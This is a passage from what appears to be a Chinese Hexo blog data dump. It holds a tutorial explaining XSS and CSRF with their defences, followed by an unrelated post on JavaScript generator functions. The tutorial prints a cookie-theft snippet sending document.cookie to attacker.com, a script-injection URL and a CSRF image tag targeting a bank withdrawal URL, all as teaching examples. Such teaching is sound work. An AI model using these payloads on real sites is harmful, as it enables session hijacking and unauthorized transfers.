occurred</p>，返回给用户</li>\n<li><p><a href=\"http://www.xxx.com/error.php?message=\" target=\"_blank\" rel=\"noopener\">www.xxx.com/error.php?message=</a><script>alert 的写法(1)</script>，当用户打开错误页面的时候，就会出现</p><p><script>alert 的写法(1)</script></p>，弹出一个消息框<p></p>\n</li>\n<li><p>当然攻击者不会很傻的只 alert 一些消息，通常 xss 都会伴随会话劫持，截获通过验证的会话令牌。</p>\n</li>\n<li>截获用户的会话后，就可以访问该用户授权访问的所有数据和功能</li>\n<li>比如攻击构造这样一个 url，message 信息如下</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> i = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\">i.src = <span class=\"string\">\"http://attacker.com?cookie=\"</span> + <span class=\"built_in\">document</span>.cookie;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>由于浏览器的同源策略，直接向 attacker.com 发送 cookie 是无法获得 <a href=\"http://www.xxx.com\" target=\"_blank\" rel=\"noopener\">www.xxx.com</a> 的 cookie，但是 img，iframe，scipr 标签可以跨域，这就是该漏洞被成为跨站脚本的原因。</li>\n</ul>\n<h2 id=\"保存型\"><a href=\"#保存型\" class=\"headerlink\" title=\"保存型\"></a>保存型</h2><ul>\n<li>脚本通常保存在后端数据库，不经过过滤就存储并且显示给用户</li>\n<li>与反射性的流程不同的是，保存型需要向服务器提出至少两次请求，第一次将含有恶意代码的数据提交给服务器，服务器将数据保存，第二次是受害者访问含有恶意代码的数据，恶意代码执行</li>\n<li>与反射型不同的是，保存型不需要一个专门设计的 url 来接受 cookie，只需要将含有恶意代码的页面发给用户，等待受害者访问即可。不过也可以用保存型的漏洞来获取用户 cookie 劫持。</li>\n<li>如果社交论坛存在保存型的 xss 漏洞，黑客将自己的个人信息一栏修改成恶意的 js 代码，该代码实现两个功能，首先受害者先加自己为好友，然后修改受害者的个人信息为该恶意代码。黑客把个人信息保存并提交给服务器，只需要等受害者访问自己的个人信息页面，浏览器就会执行恶意脚本，然后可怕的“蠕虫”就开始了</li>\n</ul>\n<h2 id=\"基于-dom-的-xss-漏洞\"><a href=\"#基于-dom-的-xss-漏洞\" class=\"headerlink\" title=\"基于 dom 的 xss 漏洞\"></a>基于 dom 的 xss 漏洞</h2><ul>\n<li>前两种 xss 漏洞，都表现为一种特殊的模式，就是应用程序提取数据并返回给受害者。而基于 dom 的 xss 不具有这种特点，攻击者是借助于 javascript 来展开攻击的</li>\n</ul>\n<h2 id=\"案例-1\"><a href=\"#案例-1\" class=\"headerlink\" title=\"案例\"></a>案例</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> url = <span class=\"built_in\">document</span>.location;</span><br><span class=\"line\"><span class=\"keyword\">let</span> message = <span class=\"regexp\">/message=(.+)$/</span>.exec(url)[<span class=\"number\">1</span>];</span><br><span class=\"line\"><span class=\"built_in\">document</span>.write(message);</span><br><span class=\"line\"><span class=\"comment\">// js脚本中这样写，如果攻击者给受害者发送www.xxx.com/error.php?message=&lt;script&gt;alert(1)&lt;/script&gt;，也可以展开xss漏洞攻击</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>所以写 js 的前端同学注意了，万一写出了有漏洞的代码，这锅得自己背。</li>\n</ul>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><ul>\n<li>过滤一些关键字</li>\n<li>Cookie 防盗，在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；设置 http-only（不能用 js 脚本进行获取）</li>\n</ul>\n<h1 id=\"csrf\"><a href=\"#csrf\" class=\"headerlink\" title=\"csrf\"></a>csrf</h1><blockquote>\n<p>cross site request forgery 的缩写，即跨站脚本请求伪造</p>\n</blockquote>\n<ul>\n<li>顾名思义是伪造请求冒充用户在站内的正常操作。</li>\n<li>我们知道绝大多数网站是通过 cookie 等方式辨识用户身份（包括服务器端 session 的网站，因为 session id 大多也是保存在 cookie），再予以授权。</li>\n<li>所以要伪造用户的正常操作，最好是通过 xss 或者链接欺骗等途径，让用户再本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求（xss 是实现 csrf 的手段之一）</li>\n</ul>\n<h2 id=\"案例-2\"><a href=\"#案例-2\" class=\"headerlink\" title=\"案例\"></a>案例</h2><ul>\n<li>一论坛网站的发帖是通过 get 请求访问，点击发帖之后 js 把发帖内容拼接成目标 url 并访问：<a href=\"http://example.com/bbs/create_post.php?title=标题&amp;content=内容\" target=\"_blank\" rel=\"noopener\">http://example.com/bbs/create_post.php?title=标题&amp;content=内容</a></li>\n<li>那么我在论坛发一贴<a href=\"http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈，只要有用户看到这个链接，那么他们的账户就会在不知情的情况下发布了这一个帖子。\" target=\"_blank\" rel=\"noopener\">http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈，只要有用户看到这个链接，那么他们的账户就会在不知情的情况下发布了这一个帖子。</a></li>\n<li>如果一家银行用以执行转账操作的 url 为 <a href=\"http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName，那么黑客可以可以再另一个网站上放置如下代码：\" target=\"_blank\" rel=\"noopener\">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName，那么黑客可以可以再另一个网站上放置如下代码：</a><img src=\"http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman\"></li>\n<li>如果有账户名为 alice 的用户访问了恶意站点，而她之前也刚访问过银行不久，登陆信息尚未过期，那么她就会损失 1000 元</li>\n</ul>\n<h2 id=\"解决方案-1\"><a href=\"#解决方案-1\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><ul>\n<li><p>如何解决这个问题，过滤用户输入，不允许发布这种含有站内操作 url 的链接，这么做可能有点用，但是阻挡不了 csrf，因为攻击者可以通过 qq 发布这个链接，这样点击到这个链接的用户一样会中招。</p>\n</li>\n<li><p>所以对待 csrf，我们的视角需要和对待 xss 有所不同。csrf 不一定要有站内的输入，因为他不属于注入攻击，而是属于请求伪造。被伪造的请求可以是任何来源，而非一定是站内。</p>\n</li>\n<li><p>过滤请求的处理者</p>\n<ul>\n<li>检查 Referer 字段：可以检查是否来源于该域名（但是请求者是可以更改 http 请求头的，他可以给这个任何值）</li>\n<li>添加校验 token：也就是请求令牌，由于 csrf 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求再访问敏感数据请求的时候，要求用户浏览器提供不保存在 cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法执行 csrf 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求的时候，这个伪乱数也一并提交上去校验。</li>\n</ul>\n</li>\n<li>改良站内 api 的设计，对于发布帖子这类创建资源的操作，应该只接受 post 请求，而 get 请求应该只浏览。最好是采用 RESTFUL 风格设计。</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/\" target=\"_blank\" rel=\"noopener\">总结 xss 与 csrf 两种跨站攻击</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h1><blockquote>\n<p>cross site scripting 的缩写，即跨站脚本攻击（为了不与 css 混淆）</p>\n</blockquote>\n<ul>\n<li>主要分为三类，反射型、保存型和基于 dom 的 xss 攻击。这些漏洞的基本原理都一样，但是确定和利用漏洞方面又存在很大差异。</li>\n</ul>\n<h2 id=\"反射型\"><a href=\"#反射型\" class=\"headerlink\" title=\"反射型\"></a>反射型</h2><ul>\n<li>如果一个 web 程序可以动态的显示用户的错误信息，就有可能产生反射型漏洞</li>\n<li>显著特征是应用程序没有进行任何过滤和净化措施</li>\n</ul>\n<h3 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h3><ul>\n<li>如果一个网站的错误消息是这样显示的，<a href=\"http://www.xxx.com/error.php?message=sorry,an\" target=\"_blank\" rel=\"noopener\">www.xxx.com/error.php?message=sorry,an</a> error occurred，然后服务器根据得到的 message，不进行过滤，复制到错误页面的模板<p>sorry,an error occurred</p>，返回给用户</li>\n<li><p><a href=\"http://www.xxx.com/error.php?message=\" target=\"_blank\" rel=\"noopener\">www.xxx.com/error.php?message=</a><script>alert 的写法(1)</script>，当用户打开错误页面的时候，就会出现</p><p><script>alert 的写法(1)</script></p>，弹出一个消息框<p></p>\n</li>\n<li><p>当然攻击者不会很傻的只 alert 一些消息，通常 xss 都会伴随会话劫持，截获通过验证的会话令牌。</p>\n</li>\n<li>截获用户的会话后，就可以访问该用户授权访问的所有数据和功能</li>\n<li>比如攻击构造这样一个 url，message 信息如下</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> i = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\">i.src = <span class=\"string\">\"http://attacker.com?cookie=\"</span> + <span class=\"built_in\">document</span>.cookie;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>由于浏览器的同源策略，直接向 attacker.com 发送 cookie 是无法获得 <a href=\"http://www.xxx.com\" target=\"_blank\" rel=\"noopener\">www.xxx.com</a> 的 cookie，但是 img，iframe，scipr 标签可以跨域，这就是该漏洞被成为跨站脚本的原因。</li>\n</ul>\n<h2 id=\"保存型\"><a href=\"#保存型\" class=\"headerlink\" title=\"保存型\"></a>保存型</h2><ul>\n<li>脚本通常保存在后端数据库，不经过过滤就存储并且显示给用户</li>\n<li>与反射性的流程不同的是，保存型需要向服务器提出至少两次请求，第一次将含有恶意代码的数据提交给服务器，服务器将数据保存，第二次是受害者访问含有恶意代码的数据，恶意代码执行</li>\n<li>与反射型不同的是，保存型不需要一个专门设计的 url 来接受 cookie，只需要将含有恶意代码的页面发给用户，等待受害者访问即可。不过也可以用保存型的漏洞来获取用户 cookie 劫持。</li>\n<li>如果社交论坛存在保存型的 xss 漏洞，黑客将自己的个人信息一栏修改成恶意的 js 代码，该代码实现两个功能，首先受害者先加自己为好友，然后修改受害者的个人信息为该恶意代码。黑客把个人信息保存并提交给服务器，只需要等受害者访问自己的个人信息页面，浏览器就会执行恶意脚本，然后可怕的“蠕虫”就开始了</li>\n</ul>\n<h2 id=\"基于-dom-的-xss-漏洞\"><a href=\"#基于-dom-的-xss-漏洞\" class=\"headerlink\" title=\"基于 dom 的 xss 漏洞\"></a>基于 dom 的 xss 漏洞</h2><ul>\n<li>前两种 xss 漏洞，都表现为一种特殊的模式，就是应用程序提取数据并返回给受害者。而基于 dom 的 xss 不具有这种特点，攻击者是借助于 javascript 来展开攻击的</li>\n</ul>\n<h2 id=\"案例-1\"><a href=\"#案例-1\" class=\"headerlink\" title=\"案例\"></a>案例</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> url = <span class=\"built_in\">document</span>.location;</span><br><span class=\"line\"><span class=\"keyword\">let</span> message = <span class=\"regexp\">/message=(.+)$/</span>.exec(url)[<span class=\"number\">1</span>];</span><br><span class=\"line\"><span class=\"built_in\">document</span>.write(message);</span><br><span class=\"line\"><span class=\"comment\">// js脚本中这样写，如果攻击者给受害者发送www.xxx.com/error.php?message=&lt;script&gt;alert(1)&lt;/script&gt;，也可以展开xss漏洞攻击</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>所以写 js 的前端同学注意了，万一写出了有漏洞的代码，这锅得自己背。</li>\n</ul>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><ul>\n<li>过滤一些关键字</li>\n<li>Cookie 防盗，在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；设置 http-only（不能用 js 脚本进行获取）</li>\n</ul>\n<h1 id=\"csrf\"><a href=\"#csrf\" class=\"headerlink\" title=\"csrf\"></a>csrf</h1><blockquote>\n<p>cross site request forgery 的缩写，即跨站脚本请求伪造</p>\n</blockquote>\n<ul>\n<li>顾名思义是伪造请求冒充用户在站内的正常操作。</li>\n<li>我们知道绝大多数网站是通过 cookie 等方式辨识用户身份（包括服务器端 session 的网站，因为 session id 大多也是保存在 cookie），再予以授权。</li>\n<li>所以要伪造用户的正常操作，最好是通过 xss 或者链接欺骗等途径，让用户再本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求（xss 是实现 csrf 的手段之一）</li>\n</ul>\n<h2 id=\"案例-2\"><a href=\"#案例-2\" class=\"headerlink\" title=\"案例\"></a>案例</h2><ul>\n<li>一论坛网站的发帖是通过 get 请求访问，点击发帖之后 js 把发帖内容拼接成目标 url 并访问：<a href=\"http://example.com/bbs/create_post.php?title=标题&amp;content=内容\" target=\"_blank\" rel=\"noopener\">http://example.com/bbs/create_post.php?title=标题&amp;content=内容</a></li>\n<li>那么我在论坛发一贴<a href=\"http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈，只要有用户看到这个链接，那么他们的账户就会在不知情的情况下发布了这一个帖子。\" target=\"_blank\" rel=\"noopener\">http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈，只要有用户看到这个链接，那么他们的账户就会在不知情的情况下发布了这一个帖子。</a></li>\n<li>如果一家银行用以执行转账操作的 url 为 <a href=\"http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName，那么黑客可以可以再另一个网站上放置如下代码：\" target=\"_blank\" rel=\"noopener\">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName，那么黑客可以可以再另一个网站上放置如下代码：</a><img src=\"http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman\"></li>\n<li>如果有账户名为 alice 的用户访问了恶意站点，而她之前也刚访问过银行不久，登陆信息尚未过期，那么她就会损失 1000 元</li>\n</ul>\n<h2 id=\"解决方案-1\"><a href=\"#解决方案-1\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><ul>\n<li><p>如何解决这个问题，过滤用户输入，不允许发布这种含有站内操作 url 的链接，这么做可能有点用，但是阻挡不了 csrf，因为攻击者可以通过 qq 发布这个链接，这样点击到这个链接的用户一样会中招。</p>\n</li>\n<li><p>所以对待 csrf，我们的视角需要和对待 xss 有所不同。csrf 不一定要有站内的输入，因为他不属于注入攻击，而是属于请求伪造。被伪造的请求可以是任何来源，而非一定是站内。</p>\n</li>\n<li><p>过滤请求的处理者</p>\n<ul>\n<li>检查 Referer 字段：可以检查是否来源于该域名（但是请求者是可以更改 http 请求头的，他可以给这个任何值）</li>\n<li>添加校验 token：也就是请求令牌，由于 csrf 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求再访问敏感数据请求的时候，要求用户浏览器提供不保存在 cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法执行 csrf 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求的时候，这个伪乱数也一并提交上去校验。</li>\n</ul>\n</li>\n<li>改良站内 api 的设计，对于发布帖子这类创建资源的操作，应该只接受 post 请求，而 get 请求应该只浏览。最好是采用 RESTFUL 风格设计。</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/\" target=\"_blank\" rel=\"noopener\">总结 xss 与 csrf 两种跨站攻击</a></li>\n</ul>\n"},{"title":"Generator函数","date":"2017-05-23T07:04:59.000Z","comments":0,"_content":"\n### Generator 函数\n\n> generator 是生成器。generator 可以看成是一个取号机，你拿一张票去向机器请求一个号码，你接受了你的号码之后，机器不会自动为你提供下一个。换句话说，取票机“暂停”直到另外一个人来请求另一个号码，此时它才会向后进行。\n\n##### generator 函数的创建\n\n* ES6 中用`function*`来创建生成器函数\n* 当想要 generator 产生一个值之后暂停执行，需要使用到`yield`（生成）关键字，有点类似于 return 关键字（都可以返回一个值），只是 yield 返回值之后 generator 函数会暂停运行\n\n```javascript\nfunction* ticketGenerate() {\n  //创建一个取号机\n  yield 1;\n  yield 2;\n  yield 3;\n}\n```\n\n* `yield*`是委派至另一个生成器函数\n\n```javascript\nfunction* anotherGenerator(i) {\n  yield i + 1;\n  yield i + 2;\n  yield i + 3;\n}\n\nfunction* generator(i) {\n  yield i;\n  yield* anotherGenerator(i);\n  yield i + 10;\n}\n\nvar gen = generator(10);\n\nconsole.log(gen.next().value); // 10\nconsole.log(gen.next().value); // 11\nconsole.log(gen.next().value); // 12\nconsole.log(gen.next().value); // 13\nconsole.log(gen.next().value); // 20\n```\n\n##### generator 函数的使用\n\n* `ticketGenerate()`不会马上执行它的主体，而是会返回一个这个生成器函数的迭代器对象\n* 当这个迭代器对象的 next 方法被调用时候，生成器函数的主体会执行到第一个 yield 表达式，该表达式定义了迭代器对象返回的值。\n* next()返回一个对象：{value:1,done:false}，value 属性是产出的值，done 属性是表示生成器是否已经产出了它最后的值。\n\n```javascript\nconst ticket = ticketGenerate(); //返回一个生成器对象\nticket.next(); //{value: 1, done: false}\n```\n\n##### 影响 generator 的状态\n\n* next()的另一个妙用是可以给它传递值，它会被视为 generator 中的 yield 语句的结果对待。\n* 因此 next 是在 generator 运行过程中向其传递信息的方式。我们可以借此来重置取号机，将号码变为 0。\n\n```javascript\nfunction* ticketGenerator() {\n  for (var i = 0; true; i++) {\n    var reset = yield i;\n    if (reset) {\n      i = -1;\n    }\n  }\n}\nvar takeANumber = ticketGenerator();\nconsole.log(takeANumber.next().value); //0\nconsole.log(takeANumber.next().value); //1\nconsole.log(takeANumber.next().value); //2\nconsole.log(takeANumber.next(true).value); //0\nconsole.log(takeANumber.next().value); //1\n```\n","source":"_posts/use-generator.md","raw":"---\ntitle: Generator函数\ndate: 2017-05-23 15:04:59\ntags: javascript\ncomments: false\n---\n\n### Generator 函数\n\n> generator 是生成器。generator 可以看成是一个取号机，你拿一张票去向机器请求一个号码，你接受了你的号码之后，机器不会自动为你提供下一个。换句话说，取票机“暂停”直到另外一个人来请求另一个号码，此时它才会向后进行。\n\n##### generator 函数的创建\n\n* ES6 中用`function*`来创建生成器函数\n* 当想要 generator 产生一个值之后暂停执行，需要使用到`yield`（生成）关键字，有点类似于 return 关键字（都可以返回一个值），只是 yield 返回值之后 generator 函数会暂停运行\n\n```javascript\nfunction* ticketGenerate() {\n  //创建一个取号机\n  yield 1;\n  yield 2;\n  yield 3;\n}\n```\n\n* `yield*`是委派至另一个生成器函数\n\n```javascript\nfunction* anotherGenerator(i) {\n  yield i + 1;\n  yield i + 2;\n  yield i + 3;\n}\n\nfunction* generator(i) {\n  yield i;\n  yield* anotherGenerator(i);\n  yield i + 10;\n}\n\nvar gen = generator(10);\n\nconsole.log(gen.next().value); // 10\nconsole.log(gen.next().value); // 11\nconsole.log(gen.next().value); // 12\nconsole.log(gen.next().value); // 13\nconsole.log(gen.next().value); // 20\n```\n\n##### generator 函数的使用\n\n* `ticketGenerate()`不会马上执行它的主体，而是会返回一个这个生成器函数的迭代器对象\n* 当这个迭代器对象的 next 方法被调用时候，生成器函数的主体会执行到第一个 yield 表达式，该表达式定义了迭代器对象返回的值。\n* next()返回一个对象：{value:1,done:false}，value 属性是产出的值，done 属性是表示生成器是否已经产出了它最后的值。\n\n```javascript\nconst ticket = ticketGenerate(); //返回一个生成器对象\nticket.next(); //{value: 1, done: false}\n```\n\n##### 影响 generator 的状态\n\n* next()的另一个妙用是可以给它传递值，它会被视为 generator 中的 yield 语句的结果对待。\n* 因此 next 是在 generator 运行过程中向其传递信息的方式。我们可以借此来重置取号机，将号码变为 0。\n\n```javascript\nfunction* ticketGenerator() {\n  for (var i = 0; true; i++) {\n    var reset = yield i;\n    if (reset) {\n      i = -1;\n    }\n  }\n}\nvar takeANumber = ticketGenerator();\nconsole.log(takeANumber.next().value); //0\nconsole.log(takeANumber.next().value); //1\nconsole.log(takeANumber.next().value); //2\nconsole.log(takeANumber.next(true).value); //0\nconsole.log(takeANumber.next().value); //1\n```\n","slug":"use-generator","published":1,"updated":"2018-04-11T03:35:08.799Z","layout":"post","photos":[],"link":"","_id":"cjsm034su004q0iof5tonvbm0","content":"<h3 id=\"Generator-函数\"><a href=\"#Generator-函数\" class=\"headerlink\" title=\"Generator 函数\"></a>Generator 函数</h3><blockquote>\n<p>generator 是生成器。generator 可以看成是一个取号机，你拿一张票去向机器请求一个号码，你接受了你的号码之后，机器不会自动为你提供下一个。换句话说，取票机“暂停”直到另外一个人来请求另一个号码，此时它才会向后进行。</p>\n</blockquote>\n<h5 id=\"generator-函数的创建\"><a href=\"#generator-函数的创建\" class=\"headerlink\" title=\"generator 函数的创建\"></a>generator 函数的创建</h5><ul>\n<li>ES6 中用<code>function*</code>来创建生成器函数</li>\n<li>当想要 generator 产生一个值之后暂停执行，需要使用到<code>yield</code>（生成）关键字，有点类似于 return 关键字（都可以返回一个值），只是 yield 返回值之后 generator 函数会暂停运行</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>* <span class=\"title\">ticketGenerate</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//创建一个取号机</span></span><br><span class=\"line\">  <span class=\"keyword\">yield</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>yield*</code>是委派至另一个生成器函数</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>* <span class=\"title\">anotherGenerator</span>(<span class=\"params\">i</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> i + <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> i + <span class=\"number\">2</span>;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> i + <span class=\"number\">3</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>* <span class=\"title\">generator</span>(<span class=\"params\">i</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> i;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span>* anotherGenerator(i);</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> i + <span class=\"number\">10</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> gen = generator(<span class=\"number\">10</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(gen.next().value); <span class=\"comment\">// 10</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(gen.next().value); <span class=\"comment\">// 11</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(gen.next().value); <span class=\"comment\">// 12</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(gen.next().value); <span class=\"comment\">// 13</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(gen.next().value); <span class=\"comment\">// 20</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"generator-函数的使用\"><a href=\"#generator-函数的使用\" class=\"headerlink\" title=\"generator 函数的使用\"></a>generator 函数的使用</h5><ul>\n<li><code>ticketGenerate()</code>不会马上执行它的主体，而是会返回一个这个生成器函数的迭代器对象</li>\n<li>当这个迭代器对象的 next 方法被调用时候，生成器函数的主体会执行到第一个 yield 表达式，该表达式定义了迭代器对象返回的值。</li>\n<li>next()返回一个对象：{value:1,done:false}，value 属性是产出的值，done 属性是表示生成器是否已经产出了它最后的值。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ticket = ticketGenerate(); <span class=\"comment\">//返回一个生成器对象</span></span><br><span class=\"line\">ticket.next(); <span class=\"comment\">//&#123;value: 1, done: false&#125;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"影响-generator-的状态\"><a href=\"#影响-generator-的状态\" class=\"headerlink\" title=\"影响 generator 的状态\"></a>影响 generator 的状态</h5><ul>\n<li>next()的另一个妙用是可以给它传递值，它会被视为 generator 中的 yield 语句的结果对待。</li>\n<li>因此 next 是在 generator 运行过程中向其传递信息的方式。我们可以借此来重置取号机，将号码变为 0。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>* <span class=\"title\">ticketGenerator</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; <span class=\"literal\">true</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> reset = <span class=\"keyword\">yield</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (reset) &#123;</span><br><span class=\"line\">      i = <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> takeANumber = ticketGenerator();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(takeANumber.next().value); <span class=\"comment\">//0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(takeANumber.next().value); <span class=\"comment\">//1</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(takeANumber.next().value); <span class=\"comment\">//2</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(takeANumber.next(<span class=\"literal\">true</span>).value); <span class=\"comment\">//0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(takeANumber.next().value); <span class=\"comment\">//1</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"Generator-函数\"><a href=\"#Generator-函数\" class=\"headerlink\" title=\"Generator 函数\"></a>Generator 函数</h3><blockquote>\n<p>generator 是生成器。generator 可以看成是一个取号机，你拿一张票去向机器请求一个号码，你接受了你的号码之后，机器不会自动为你提供下一个。换句话说，取票机“暂停”直到另外一个人来请求另一个号码，此时它才会向后进行。</p>\n</blockquote>\n<h5 id=\"generator-函数的创建\"><a href=\"#generator-函数的创建\" class=\"headerlink\" title=\"generator 函数的创建\"></a>generator 函数的创建</h5><ul>\n<li>ES6 中用<code>function*</code>来创建生成器函数</li>\n<li>当想要 generator 产生一个值之后暂停执行，需要使用到<code>yield</code>（生成）关键字，有点类似于 return 关键字（都可以返回一个值），只是 yield 返回值之后 generator 函数会暂停运行</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>* <span class=\"title\">ticketGenerate</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//创建一个取号机</span></span><br><span class=\"line\">  <span class=\"keyword\">yield</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span 